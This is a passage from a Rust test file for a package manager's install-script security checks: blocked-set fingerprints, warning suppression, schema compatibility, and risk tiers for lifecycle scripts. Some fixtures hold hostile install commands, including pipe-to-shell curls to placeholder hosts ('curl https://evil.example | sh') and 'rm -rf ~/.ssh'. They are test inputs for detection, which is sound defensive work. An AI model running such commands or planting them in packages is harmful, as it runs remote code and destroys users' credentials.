        let b = vec![make_blocked("esbuild", "0.25.1", None, Some("sha256-new"))];
        assert_ne!(
            compute_blocked_set_fingerprint(&a),
            compute_blocked_set_fingerprint(&b),
        );
    }

    #[test]
    fn compute_blocked_set_fingerprint_changes_on_integrity_change() {
        let a = vec![make_blocked(
            "esbuild",
            "0.25.1",
            Some("sha512-old"),
            Some("sha256-x"),
        )];
        let b = vec![make_blocked(
            "esbuild",
            "0.25.1",
            Some("sha512-new"),
            Some("sha256-x"),
        )];
        assert_ne!(
            compute_blocked_set_fingerprint(&a),
            compute_blocked_set_fingerprint(&b),
        );
    }

    #[test]
    fn compute_blocked_set_fingerprint_changes_when_package_added() {
        let a = vec![make_blocked("esbuild", "0.25.1", None, Some("sha256-x"))];
        let b = vec![
            make_blocked("esbuild", "0.25.1", None, Some("sha256-x")),
            make_blocked("sharp", "0.33.0", None, Some("sha256-z")),
        ];
        assert_ne!(
            compute_blocked_set_fingerprint(&a),
            compute_blocked_set_fingerprint(&b),
        );
    }

    #[test]
    fn compute_blocked_set_fingerprint_empty_set_is_stable() {
        let f1 = compute_blocked_set_fingerprint(&[]);
        let f2 = compute_blocked_set_fingerprint(&[]);
        assert_eq!(f1, f2);
        assert!(f1.starts_with("sha256-"));
    }

    #[test]
    fn compute_blocked_set_fingerprint_format_starts_with_sha256_prefix() {
        let f =
            compute_blocked_set_fingerprint(&[make_blocked("x", "1.0.0", None, Some("sha256-y"))]);
        assert!(f.starts_with("sha256-"));
        assert_eq!(f.len(), 71);
    }

    // ── capture_blocked_set_after_install (suppression rule) ──────────
    //
    // These tests construct a synthetic `installed` slice and a fake
    // store directory. The store has to contain a `package.json` with
    // lifecycle scripts so `compute_script_hash` returns Some.

    fn fake_store_with_pkg(
        store_root: &Path,
        name: &str,
        version: &str,
        scripts: &serde_json::Value,
    ) {
        // Mirror PackageStore::package_dir layout: <store_root>/v1/<safe_name>@<version>/
        let safe = name.replace('/', "+");
        let pkg_dir = store_root.join("v1").join(format!("{safe}@{version}"));
        fs::create_dir_all(&pkg_dir).unwrap();
        let pkg = serde_json::json!({
            "name": name,
            "version": version,
            "scripts": scripts,
        });
        fs::write(
            pkg_dir.join("package.json"),
            serde_json::to_string_pretty(&pkg).unwrap(),
        )
        .unwrap();
    }

    fn fake_store_at(store_root: &Path) -> PackageStore {
        // PackageStore::at(root) is the test constructor that creates a
        // store at an arbitrary path with the standard v1 layout under it.
        PackageStore::at(store_root.to_path_buf())
    }

    fn empty_policy() -> SecurityPolicy {
        SecurityPolicy::default_policy()
    }

    fn rich_policy(
        name: &str,
        version: &str,
        integrity: Option<&str>,
        script_hash: Option<&str>,
    ) -> SecurityPolicy {
        let mut map = HashMap::new();
        map.insert(
            format!("{name}@{version}"),
            TrustedDependencyBinding {
                integrity: integrity.map(String::from),
                script_hash: script_hash.map(String::from),
                ..Default::default()
            },
        );
        SecurityPolicy {
            trusted_dependencies: TrustedDependencies::Rich(map),
            minimum_release_age_secs: 0,
        }
    }

    #[test]
    fn capture_emits_warning_on_first_install_with_blocked_packages() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        let store = fake_store_at(store_root.path());

        let installed = vec![(
            "esbuild".to_string(),
            "0.25.1".to_string(),
            Some("sha512-x".to_string()),
        )];
        let capture =
            capture_blocked_set_after_install(project.path(), &store, &installed, &empty_policy())
                .unwrap();

        assert!(capture.should_emit_warning);
        assert!(!capture.all_clear_banner);
        assert!(capture.previous_fingerprint.is_none());
        assert_eq!(capture.state.blocked_packages.len(), 1);
        assert_eq!(capture.state.blocked_packages[0].name, "esbuild");
    }

    #[test]
    fn capture_silent_on_first_install_with_no_scriptable_packages() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        let store = fake_store_at(store_root.path());

        // Empty installed list — nothing to block
        let capture =
            capture_blocked_set_after_install(project.path(), &store, &[], &empty_policy())
                .unwrap();
        assert!(!capture.should_emit_warning);
        assert!(capture.state.blocked_packages.is_empty());
    }

    #[test]
    fn capture_silent_when_repeating_install_with_unchanged_blocked_set() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        let store = fake_store_at(store_root.path());

        let installed = vec![(
            "esbuild".to_string(),
            "0.25.1".to_string(),
            Some("sha512-x".to_string()),
        )];

        // First install: emits
        let cap1 =
            capture_blocked_set_after_install(project.path(), &store, &installed, &empty_policy())
                .unwrap();
        assert!(cap1.should_emit_warning);

        // Second install with the SAME blocked set: silent
        let cap2 =
            capture_blocked_set_after_install(project.path(), &store, &installed, &empty_policy())
                .unwrap();
        assert!(
            !cap2.should_emit_warning,
            "second install with unchanged blocked set must NOT re-warn"
        );
        assert_eq!(
            cap1.state.blocked_set_fingerprint,
            cap2.state.blocked_set_fingerprint
        );
    }

    #[test]
    fn capture_re_emits_when_new_package_added_to_blocked_set() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        fake_store_with_pkg(
            store_root.path(),
            "sharp",
            "0.33.0",
            &serde_json::json!({"install": "node-gyp rebuild"}),
        );
        let store = fake_store_at(store_root.path());

        // First install: only esbuild
        let cap1 = capture_blocked_set_after_install(
            project.path(),
            &store,
            &[("esbuild".to_string(), "0.25.1".to_string(), None)],
            &empty_policy(),
        )
        .unwrap();
        assert!(cap1.should_emit_warning);

        // Second install: esbuild + sharp
        let cap2 = capture_blocked_set_after_install(
            project.path(),
            &store,
            &[
                ("esbuild".to_string(), "0.25.1".to_string(), None),
                ("sharp".to_string(), "0.33.0".to_string(), None),
            ],
            &empty_policy(),
        )
        .unwrap();
        assert!(
            cap2.should_emit_warning,
            "adding a new blocked package must re-emit"
        );
        assert_ne!(
            cap1.state.blocked_set_fingerprint,
            cap2.state.blocked_set_fingerprint
        );
    }

    #[test]
    fn capture_re_emits_when_script_hash_drifts_for_existing_package() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();

        // Initial install with one script body
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        let store = fake_store_at(store_root.path());
        let installed = vec![("esbuild".to_string(), "0.25.1".to_string(), None)];
        let cap1 =
            capture_blocked_set_after_install(project.path(), &store, &installed, &empty_policy())
                .unwrap();
        assert!(cap1.should_emit_warning);

        // Mutate the package.json in the store to drift the script hash
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js && curl evil.com"}),
        );

        let cap2 =
            capture_blocked_set_after_install(project.path(), &store, &installed, &empty_policy())
                .unwrap();
        assert!(cap2.should_emit_warning, "script hash drift must re-emit");
        assert_ne!(
            cap1.state.blocked_set_fingerprint,
            cap2.state.blocked_set_fingerprint
        );
    }

    #[test]
    fn capture_emits_positive_clear_banner_when_all_previously_blocked_now_approved() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        let store = fake_store_at(store_root.path());

        // First install with empty policy → blocked
        let installed = vec![(
            "esbuild".to_string(),
            "0.25.1".to_string(),
            Some("sha512-x".to_string()),
        )];
        let cap1 =
            capture_blocked_set_after_install(project.path(), &store, &installed, &empty_policy())
                .unwrap();
        assert!(cap1.should_emit_warning);
        assert!(!cap1.all_clear_banner);
        let captured_script_hash = cap1.state.blocked_packages[0].script_hash.clone().unwrap();

        // Second install with a policy that approves esbuild (we use the
        // captured script_hash from cap1 so the binding matches)
        let policy = rich_policy(
            "esbuild",
            "0.25.1",
            Some("sha512-x"),
            Some(&captured_script_hash),
        );
        let cap2 =
            capture_blocked_set_after_install(project.path(), &store, &installed, &policy).unwrap();
        assert!(cap2.should_emit_warning);
        assert!(
            cap2.all_clear_banner,
            "transition from blocked → all approved must surface as positive banner"
        );
        assert!(cap2.state.blocked_packages.is_empty());

        // Third install with the same policy → silent (no positive banner spam)
        let cap3 =
            capture_blocked_set_after_install(project.path(), &store, &installed, &policy).unwrap();
        assert!(
            !cap3.should_emit_warning,
            "after the all-clear banner, repeated installs are silent"
        );
    }

    #[test]
    fn capture_marks_drifted_packages_with_binding_drift_flag() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        let store = fake_store_at(store_root.path());

        // Policy approves esbuild but with a STALE script hash → drift
        let policy = rich_policy("esbuild", "0.25.1", Some("sha512-x"), Some("sha256-stale"));
        let installed = vec![(
            "esbuild".to_string(),
            "0.25.1".to_string(),
            Some("sha512-x".to_string()),
        )];
        let capture =
            capture_blocked_set_after_install(project.path(), &store, &installed, &policy).unwrap();

        assert!(capture.should_emit_warning);
        assert_eq!(capture.state.blocked_packages.len(), 1);
        assert!(
            capture.state.blocked_packages[0].binding_drift,
            "drifted approval must be flagged"
        );
    }

    #[test]
    fn capture_skips_packages_with_no_install_phases() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        fake_store_with_pkg(
            store_root.path(),
            "tsc",
            "5.0.0",
            // build/test ARE in the package.json but NOT in EXECUTED_INSTALL_PHASES
            &serde_json::json!({"build": "tsc", "test": "vitest"}),
        );
        let store = fake_store_at(store_root.path());

        let capture = capture_blocked_set_after_install(
            project.path(),
            &store,
            &[("tsc".to_string(), "5.0.0".to_string(), None)],
            &empty_policy(),
        )
        .unwrap();
        assert!(capture.state.blocked_packages.is_empty());
        assert!(!capture.should_emit_warning);
    }

    #[test]
    fn capture_legacy_name_only_approval_does_not_block() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        let store = fake_store_at(store_root.path());

        // Legacy bare-name entry — covers esbuild leniently
        let policy = SecurityPolicy {
            trusted_dependencies: TrustedDependencies::Legacy(vec!["esbuild".to_string()]),
            minimum_release_age_secs: 0,
        };

        let capture = capture_blocked_set_after_install(
            project.path(),
            &store,
            &[("esbuild".to_string(), "0.25.1".to_string(), None)],
            &policy,
        )
        .unwrap();

        // Legacy approval is enough to NOT block (M5 will run the script
        // with a deprecation warning). The blocked set is for things the
        // user must REVIEW.
        assert!(capture.state.blocked_packages.is_empty());
        assert!(!capture.should_emit_warning);
    }

    #[test]
    fn capture_writes_state_file_on_every_call_even_when_silent() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        let store = fake_store_at(store_root.path());

        // First call: silent (no installed packages), but state file written
        let cap1 = capture_blocked_set_after_install(project.path(), &store, &[], &empty_policy())
            .unwrap();
        assert!(!cap1.should_emit_warning);
        assert!(read_build_state(project.path()).is_some());

        // Captured_at is updated even if fingerprint is unchanged
        let captured_at_1 = read_build_state(project.path()).unwrap().captured_at;

        std::thread::sleep(std::time::Duration::from_millis(1100));

        let _ = capture_blocked_set_after_install(project.path(), &store, &[], &empty_policy())
            .unwrap();
        let captured_at_2 = read_build_state(project.path()).unwrap().captured_at;
        assert_ne!(
            captured_at_1, captured_at_2,
            "captured_at must refresh on every install"
        );
    }

    // ─── Phase 46 schema compatibility ─────────────────────────────
    //
    // The no-version-bump strategy (see `BUILD_STATE_VERSION` doc)
    // requires BOTH directions of compat to hold:
    //
    //   1. A Phase 46 reader on a v1-written file defaults the new
    //      fields to None via #[serde(default)] (backward compat).
    //   2. A v1 reader on a Phase-46-written file silently drops the
    //      new fields because the struct lacks deny_unknown_fields
    //      (forward compat).
    //
    // Both are here so a regression in either direction fails CI.

    #[test]
    fn phase46_reader_defaults_missing_fields_from_v1_json() {
        // Hand-written JSON as a pre-Phase-46 writer would produce:
        // only the v1 fields, no static_tier / provenance / etc.
        let v1_json = r#"{
            "state_version": 1,
            "blocked_set_fingerprint": "sha256-legacy",
            "captured_at": "2026-03-01T00:00:00Z",
            "blocked_packages": [
                {
                    "name": "esbuild",
                    "version": "0.25.1",
                    "integrity": "sha512-x",
                    "script_hash": "sha256-y",
                    "phases_present": ["postinstall"],
                    "binding_drift": false
                }
            ]
        }"#;

        let state: BuildState = serde_json::from_str(v1_json).unwrap();
        assert_eq!(state.state_version, 1);
        assert_eq!(state.blocked_packages.len(), 1);

        let pkg = &state.blocked_packages[0];
        // All Phase 46 additions must default to None without the
        // JSON naming them explicitly.
        assert_eq!(pkg.static_tier, None);
        assert_eq!(pkg.provenance_at_capture, None);
        assert_eq!(pkg.published_at, None);
        assert_eq!(pkg.behavioral_tags_hash, None);

        // v1 semantics preserved end-to-end.
        assert_eq!(pkg.name, "esbuild");
        assert_eq!(pkg.binding_drift, false);
    }

    #[test]
    fn v1_reader_silently_drops_phase46_fields_on_read() {
        // Simulate a v1 reader by defining a struct that ONLY has the
        // v1 fields. A Phase-46-written JSON must parse into it with
        // all v1 fields intact; the unknown Phase 46 fields must be
        // silently dropped because no `deny_unknown_fields` is in
        // effect.
        #[derive(Debug, Deserialize, PartialEq, Eq)]
        struct V1BlockedPackage {
            name: String,
            version: String,
            integrity: Option<String>,
            script_hash: Option<String>,
            phases_present: Vec<String>,
            binding_drift: bool,
        }

        let p46 = BlockedPackage {
            name: "sharp".into(),
            version: "0.33.0".into(),
            integrity: Some("sha512-aaa".into()),
            script_hash: Some("sha256-bbb".into()),
            phases_present: vec!["postinstall".into()],
            binding_drift: false,
            static_tier: Some(StaticTier::Amber),
            provenance_at_capture: Some(ProvenanceSnapshot {
                present: true,
                publisher: Some("github:lovell/sharp".into()),
                ..Default::default()
            }),
            published_at: Some("2026-04-20T00:00:00Z".into()),
            behavioral_tags_hash: Some("sha256-ccc".into()),
        };
        let json = serde_json::to_string(&p46).unwrap();

        let v1: V1BlockedPackage = serde_json::from_str(&json).unwrap();
        assert_eq!(v1.name, "sharp");
        assert_eq!(v1.version, "0.33.0");
        assert_eq!(v1.integrity.as_deref(), Some("sha512-aaa"));
        assert_eq!(v1.script_hash.as_deref(), Some("sha256-bbb"));
        assert_eq!(v1.phases_present, vec!["postinstall".to_string()]);
        assert_eq!(v1.binding_drift, false);
    }

    #[test]
    fn phase46_populated_fields_roundtrip() {
        let original = BlockedPackage {
            name: "puppeteer".into(),
            version: "22.0.0".into(),
            integrity: Some("sha512-pp".into()),
            script_hash: Some("sha256-pp".into()),
            phases_present: vec!["postinstall".into()],
            binding_drift: false,
            static_tier: Some(StaticTier::Amber),
            provenance_at_capture: Some(ProvenanceSnapshot {
                present: true,
                publisher: Some("github:puppeteer/puppeteer".into()),
                workflow_path: Some(".github/workflows/publish.yml".into()),
                workflow_ref: Some("refs/tags/v22.0.0".into()),
                attestation_cert_sha256: Some("sha256-cert".into()),
            }),
            published_at: Some("2026-04-18T12:34:56Z".into()),
            behavioral_tags_hash: Some("sha256-tags".into()),
        };
        let json = serde_json::to_string(&original).unwrap();
        let back: BlockedPackage = serde_json::from_str(&json).unwrap();
        assert_eq!(original, back);
    }

    #[test]
    fn read_build_state_rejects_newer_version() {
        // Simulate a future LPM binary writing state_version = 2.
        // This binary's reader must refuse and return None (the
        // caller will write a fresh v1 state, not mis-interpret v2
        // semantics with v1 types).
        let project = tempdir().unwrap();
        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
        let future_json = format!(
            r#"{{
                "state_version": {next_version},
                "blocked_set_fingerprint": "sha256-future",
                "captured_at": "2027-01-01T00:00:00Z",
                "blocked_packages": []
            }}"#,
            next_version = BUILD_STATE_VERSION + 1,
        );
        std::fs::write(build_state_path(project.path()), future_json).unwrap();

        assert!(
            read_build_state(project.path()).is_none(),
            "reader must refuse files newer than BUILD_STATE_VERSION"
        );
    }

    #[test]
    fn read_build_state_accepts_equal_version() {
        // Sanity check for the `>` comparison: equal version parses.
        let project = tempdir().unwrap();
        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
        let state = make_state(vec![make_blocked(
            "esbuild",
            "0.25.1",
            Some("sha512-x"),
            Some("sha256-y"),
        )]);
        let json = serde_json::to_string(&state).unwrap();
        std::fs::write(build_state_path(project.path()), json).unwrap();

        let read = read_build_state(project.path());
        assert!(
            read.is_some(),
            "reader must accept files at the current BUILD_STATE_VERSION"
        );
        assert_eq!(read.unwrap().blocked_packages.len(), 1);
    }

    // ─── Phase 46 P1: metadata plumbing ───────────────────────────
    //
    // The `_with_metadata` variants forward `published_at` and
    // `behavioral_tags_hash` onto captured `BlockedPackage` entries.
    // The caller (install.rs) populates the map from the registry
    // metadata the cooldown check already fetched.

    fn make_metadata(
        published_at: Option<&str>,
        behavioral_tags_hash: Option<&str>,
    ) -> BlockedSetMetadataEntry {
        BlockedSetMetadataEntry {
            published_at: published_at.map(String::from),
            behavioral_tags_hash: behavioral_tags_hash.map(String::from),
            // P4 Chunk 3: the Phase-46-P1 tests don't stress
            // provenance_at_capture; use `Default` so future fields
            // don't force every test-helper re-edit. Dedicated
            // provenance capture tests live in lpm-security and in
            // the Chunk 5 E2E harness.
            ..Default::default()
        }
    }

    fn store_pkg_with_postinstall(store: &lpm_store::PackageStore, name: &str, version: &str) {
        let pkg_dir = store.package_dir(name, version);
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("package.json"),
            format!(
                r#"{{"name":"{name}","version":"{version}","scripts":{{"postinstall":"node install.js"}}}}"#
            ),
        )
        .unwrap();
    }

    #[test]
    fn compute_with_metadata_forwards_published_at_and_behavioral_tags_hash() {
        // Core P1 contract: when the caller supplies metadata for a
        // blockable package, both optional fields on the emitted
        // BlockedPackage are populated verbatim.
        let project = tempdir().unwrap();
        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
        let store = lpm_store::PackageStore::at(project.path().join("store"));
        store_pkg_with_postinstall(&store, "sharp", "0.33.0");

        let installed = vec![("sharp".to_string(), "0.33.0".to_string(), None)];
        let mut metadata = BlockedSetMetadata::default();
        metadata.insert(
            "sharp".to_string(),
            "0.33.0".to_string(),
            make_metadata(Some("2026-04-18T12:34:56Z"), Some("sha256-tag-hash-abc")),
        );

        let blocked =
            compute_blocked_packages_with_metadata(&store, &installed, &empty_policy(), &metadata);

        assert_eq!(blocked.len(), 1);
        assert_eq!(blocked[0].name, "sharp");
        assert_eq!(
            blocked[0].published_at.as_deref(),
            Some("2026-04-18T12:34:56Z"),
            "published_at MUST be forwarded from metadata map to BlockedPackage"
        );
        assert_eq!(
            blocked[0].behavioral_tags_hash.as_deref(),
            Some("sha256-tag-hash-abc"),
            "behavioral_tags_hash MUST be forwarded from metadata map to BlockedPackage"
        );
    }

    #[test]
    fn compute_with_metadata_missing_entry_leaves_fields_none() {
        // Graceful degradation: when the caller has NO metadata for a
        // package (offline, fast-path, registry error), both Phase 46
        // fields stay None on the emitted BlockedPackage.
        let project = tempdir().unwrap();
        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
        let store = lpm_store::PackageStore::at(project.path().join("store"));
        store_pkg_with_postinstall(&store, "sharp", "0.33.0");

        let installed = vec![("sharp".to_string(), "0.33.0".to_string(), None)];
        // Empty metadata map — caller didn't fetch / couldn't fetch.
        let metadata = BlockedSetMetadata::default();

        let blocked =
            compute_blocked_packages_with_metadata(&store, &installed, &empty_policy(), &metadata);

        assert_eq!(blocked.len(), 1);
        assert!(
            blocked[0].published_at.is_none(),
            "missing metadata entry → published_at stays None (graceful)"
        );
        assert!(
            blocked[0].behavioral_tags_hash.is_none(),
            "missing metadata entry → behavioral_tags_hash stays None (graceful)"
        );
    }

    #[test]
    fn compute_with_metadata_partial_entry_forwards_only_populated_half() {
        // One field present, one absent: forward what we have, leave
        // the other None. Common real-world case: npm packages often
        // have a `time` entry but no server-side behavioral analysis.
        let project = tempdir().unwrap();
        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
        let store = lpm_store::PackageStore::at(project.path().join("store"));
        store_pkg_with_postinstall(&store, "some-npm-pkg", "1.0.0");

        let installed = vec![("some-npm-pkg".to_string(), "1.0.0".to_string(), None)];
        let mut metadata = BlockedSetMetadata::default();
        metadata.insert(
            "some-npm-pkg".to_string(),
            "1.0.0".to_string(),
            make_metadata(Some("2026-04-20T00:00:00Z"), None),
        );

        let blocked =
            compute_blocked_packages_with_metadata(&store, &installed, &empty_policy(), &metadata);

        assert_eq!(blocked.len(), 1);
        assert_eq!(
            blocked[0].published_at.as_deref(),
            Some("2026-04-20T00:00:00Z"),
            "populated half forwards"
        );
        assert!(
            blocked[0].behavioral_tags_hash.is_none(),
            "unpopulated half stays None (no server analysis)"
        );
    }

    #[test]
    fn backward_compat_wrapper_captures_with_empty_metadata() {
        // `capture_blocked_set_after_install` (no-metadata variant)
        // remains a valid entry point; it just produces BlockedPackage
        // entries with both P1 fields as None. Pins the wrapper
        // contract for the ~30 test callers that use it.
        let project = tempdir().unwrap();
        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
        let store = lpm_store::PackageStore::at(project.path().join("store"));
        store_pkg_with_postinstall(&store, "sharp", "0.33.0");

        let installed = vec![("sharp".to_string(), "0.33.0".to_string(), None)];
        let capture =
            capture_blocked_set_after_install(project.path(), &store, &installed, &empty_policy())
                .unwrap();

        assert_eq!(capture.state.blocked_packages.len(), 1);
        let pkg = &capture.state.blocked_packages[0];
        assert!(
            pkg.published_at.is_none() && pkg.behavioral_tags_hash.is_none(),
            "no-metadata wrapper must leave both P1 fields None"
        );
    }

    #[test]
    fn metadata_fingerprint_is_independent_of_metadata() {
        // Design invariant: the blocked-set fingerprint is a stability
        // metric over *blockable* packages and their strict binding
        // tuple, NOT over their metadata. Installs with differing
        // published_at / behavioral_tags_hash but same blocked set
        // MUST produce identical fingerprints. Otherwise the post-
        // install "blocked set unchanged" suppression would spuriously
        // re-fire on registry metadata churn.
        let project = tempdir().unwrap();
        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
        let store = lpm_store::PackageStore::at(project.path().join("store"));
        store_pkg_with_postinstall(&store, "sharp", "0.33.0");

        let installed = vec![("sharp".to_string(), "0.33.0".to_string(), None)];
        let meta_a = {
            let mut m = BlockedSetMetadata::default();
            m.insert(
                "sharp".to_string(),
                "0.33.0".to_string(),
                make_metadata(Some("2026-04-01T00:00:00Z"), Some("sha256-aaa")),
            );
            m
        };
        let meta_b = {
            let mut m = BlockedSetMetadata::default();
            m.insert(
                "sharp".to_string(),
                "0.33.0".to_string(),
                make_metadata(Some("2026-04-20T00:00:00Z"), Some("sha256-bbb")),
            );
            m
        };

        let bp_a =
            compute_blocked_packages_with_metadata(&store, &installed, &empty_policy(), &meta_a);
        let bp_b =
            compute_blocked_packages_with_metadata(&store, &installed, &empty_policy(), &meta_b);
        let fp_a = compute_blocked_set_fingerprint(&bp_a);
        let fp_b = compute_blocked_set_fingerprint(&bp_b);
        assert_eq!(
            fp_a, fp_b,
            "fingerprint must be independent of metadata-only fields — \
             otherwise registry churn would spuriously re-fire the \
             post-install blocked-set warning"
        );
    }

    // ── Phase 46 P2 Chunk 3 — read_install_phase_bodies + static_tier ─

    fn store_pkg_with_scripts(
        store: &lpm_store::PackageStore,
        name: &str,
        version: &str,
        scripts: &serde_json::Value,
    ) {
        let pkg_dir = store.package_dir(name, version);
        std::fs::create_dir_all(&pkg_dir).unwrap();
        let pkg = serde_json::json!({
            "name": name,
            "version": version,
            "scripts": scripts,
        });
        std::fs::write(
            pkg_dir.join("package.json"),
            serde_json::to_string_pretty(&pkg).unwrap(),
        )
        .unwrap();
    }

    #[test]
    fn read_install_phase_bodies_returns_pairs_in_canonical_order() {
        // Even if `scripts` is authored with postinstall before
        // preinstall, the output order must match
        // EXECUTED_INSTALL_PHASES (preinstall, install, postinstall)
        // so worst-wins aggregation is stable across JSON
        // re-serialization.
        let project = tempdir().unwrap();
        let store = lpm_store::PackageStore::at(project.path().join("store"));
        store_pkg_with_scripts(
            &store,
            "x",
            "1.0.0",
            &serde_json::json!({
                "postinstall": "tsc",
                "preinstall": "husky install",
                "other": "irrelevant"
            }),
        );

        let pkg_dir = store.package_dir("x", "1.0.0");
        let pairs = read_install_phase_bodies(&pkg_dir);
        assert_eq!(
            pairs,
            vec![
                ("preinstall".to_string(), "husky install".to_string()),
                ("postinstall".to_string(), "tsc".to_string()),
            ],
            "phases must emit in EXECUTED_INSTALL_PHASES order",
        );
    }

    #[test]
    fn read_install_phase_bodies_skips_empty_body_phases() {
        let project = tempdir().unwrap();
        let store = lpm_store::PackageStore::at(project.path().join("store"));
        store_pkg_with_scripts(
            &store,
            "x",
            "1.0.0",
            &serde_json::json!({ "preinstall": "", "postinstall": "tsc" }),
        );

        let pkg_dir = store.package_dir("x", "1.0.0");
        let pairs = read_install_phase_bodies(&pkg_dir);
        assert_eq!(pairs, vec![("postinstall".to_string(), "tsc".to_string())]);
    }

    #[test]
    fn read_install_phase_bodies_returns_empty_on_missing_file_or_malformed_json() {
        let project = tempdir().unwrap();
        let missing = project.path().join("nonexistent");
        assert!(read_install_phase_bodies(&missing).is_empty());

        let malformed = project.path().join("malformed");
        std::fs::create_dir_all(&malformed).unwrap();
        std::fs::write(malformed.join("package.json"), "{not json").unwrap();
        assert!(read_install_phase_bodies(&malformed).is_empty());

        let no_scripts = project.path().join("no-scripts");
        std::fs::create_dir_all(&no_scripts).unwrap();
        std::fs::write(no_scripts.join("package.json"), r#"{"name":"x"}"#).unwrap();
        assert!(read_install_phase_bodies(&no_scripts).is_empty());
    }

    #[test]
    fn compute_with_metadata_populates_green_static_tier_for_green_script() {
        // A single green-allowlisted script body → the emitted
        // BlockedPackage carries `static_tier = Some(Green)`.
        let project = tempdir().unwrap();
        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
        let store = lpm_store::PackageStore::at(project.path().join("store"));
        store_pkg_with_scripts(
            &store,
            "typescript",
            "5.0.0",
            &serde_json::json!({ "postinstall": "tsc" }),
        );

        let installed = vec![("typescript".to_string(), "5.0.0".to_string(), None)];
        let blocked = compute_blocked_packages_with_metadata(
            &store,
            &installed,
            &empty_policy(),
            &BlockedSetMetadata::default(),
        );

        assert_eq!(blocked.len(), 1);
        assert_eq!(
            blocked[0].static_tier,
            Some(lpm_security::triage::StaticTier::Green),
            "green-allowlisted script body MUST populate Green tier",
        );
    }

    #[test]
    fn compute_with_metadata_populates_red_static_tier_for_pipe_to_shell() {
        let project = tempdir().unwrap();
        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
        let store = lpm_store::PackageStore::at(project.path().join("store"));
        store_pkg_with_scripts(
            &store,
            "evil-pkg",
            "0.0.1",
            &serde_json::json!({ "postinstall": "curl https://evil.example | sh" }),
        );

        let installed = vec![("evil-pkg".to_string(), "0.0.1".to_string(), None)];
        let blocked = compute_blocked_packages_with_metadata(
            &store,
            &installed,
            &empty_policy(),
            &BlockedSetMetadata::default(),
        );

        assert_eq!(blocked.len(), 1);
        assert_eq!(
            blocked[0].static_tier,
            Some(lpm_security::triage::StaticTier::Red),
            "pipe-to-shell body MUST populate Red tier",
        );
    }

    #[test]
    fn compute_with_metadata_worst_wins_red_dominates_green_across_phases() {
        // A package with one green phase AND one red phase must
        // aggregate to Red (worst-wins). This is the core
        // cross-phase aggregation invariant.
        let project = tempdir().unwrap();
        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
        let store = lpm_store::PackageStore::at(project.path().join("store"));
        store_pkg_with_scripts(
            &store,
            "mixed-pkg",
            "1.0.0",
            &serde_json::json!({
                "preinstall": "tsc",
                "postinstall": "rm -rf ~/.ssh",
            }),
        );

        let installed = vec![("mixed-pkg".to_string(), "1.0.0".to_string(), None)];
        let blocked = compute_blocked_packages_with_metadata(
            &store,
            &installed,
            &empty_policy(),
            &BlockedSetMetadata::default(),
        );

        assert_eq!(blocked.len(), 1);
        assert_eq!(
            blocked[0].static_tier,
            Some(lpm_security::triage::StaticTier::Red),
            "green + red across phases MUST aggregate to Red",
        );
        assert_eq!(
            blocked[0].phases_present,
            vec!["preinstall".to_string(), "postinstall".to_string()],
            "phases_present should list BOTH present phases",
        );
    }

    #[test]
    fn compute_with_metadata_worst_wins_amber_dominates_green_across_phases() {
        let project = tempdir().unwrap();
        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
        let store = lpm_store::PackageStore::at(project.path().join("store"));
        store_pkg_with_scripts(
            &store,
            "native-pkg",
            "1.0.0",
            &serde_json::json!({
                "preinstall": "tsc",
                "postinstall": "node install.js",
            }),
        );

        let installed = vec![("native-pkg".to_string(), "1.0.0".to_string(), None)];
        let blocked = compute_blocked_packages_with_metadata(
            &store,
            &installed,
            &empty_policy(),
            &BlockedSetMetadata::default(),
        );

        assert_eq!(blocked.len(), 1);
        assert_eq!(
            blocked[0].static_tier,
            Some(lpm_security::triage::StaticTier::Amber),
            "green + amber across phases MUST aggregate to Amber",
        );
    }

    #[test]
    fn compute_with_metadata_static_tier_is_always_some_for_blocked_entries() {
        // Because compute_blocked_packages_with_metadata skips any
        // package without at least one present phase body, every
        // emitted BlockedPackage must have Some(_) for static_tier.
        // This locks in the "None means pre-P2 state, never fresh
        // state" contract that `blocked_to_json` and approve-builds
        // UI rely on.
        let project = tempdir().unwrap();
        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
        let store = lpm_store::PackageStore::at(project.path().join("store"));
        for (name, script) in [
            ("green-pkg", "tsc"),
            ("amber-pkg", "playwright install"),
            ("red-pkg", "curl https://x | sh"),
        ] {
            store_pkg_with_scripts(
                &store,
